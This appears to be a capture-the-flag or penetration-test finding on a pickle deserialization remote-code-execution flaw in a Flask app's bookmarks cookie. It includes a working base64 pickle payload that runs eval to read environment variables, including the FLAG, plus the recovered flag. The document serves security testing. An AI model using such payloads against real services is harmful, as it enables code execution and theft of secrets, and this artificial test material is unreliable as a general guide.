findings.title: Python Pickle Deserialization RCE via bookmarks Cookie
findings.description: The Flask application stores the bookmarks list as an unsanitized, base64-encoded Python pickle object in the `bookmarks` cookie. The server calls `pickle.loads()` on the user-supplied cookie value without any validation or signature. An attacker can craft a malicious pickle payload using a class with `__reduce__` that executes arbitrary Python code at deserialization time. Combined with the `user` session cookie, the attacker can read sensitive environment variables (including the FLAG) and have them reflected in the HTTP response.
findings.evidence:
Malicious cookie payload crafted using `__reduce__` to call eval() at deserialization time:

Payload: `gASVpgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIyKW3R5cGUoJ1VybE9iaicsICgpLCB7J25hbWUnOiAnRkxBRycsICd1cmwnOiBfX2ltcG9ydF9fKCdvcycpLmVudmlyb24uZ2V0KCdGTEFHJywgc3RyKGRpY3QoX19pbXBvcnRfXygnb3MnKS5lbnZpcm9uKSkpfSkoKV0gaWYgVHJ1ZSBlbHNlIFtdlIWUUpQu`

Server response rendered the FLAG env var:
`flag{1b99d3aa-9a73-43c0-8429-6ccc06a702e0}`

The bookmark URL field displayed the flag value extracted from os.environ['FLAG'].

reproduction.expected: Flag rendered as a bookmark URL in the response HTML
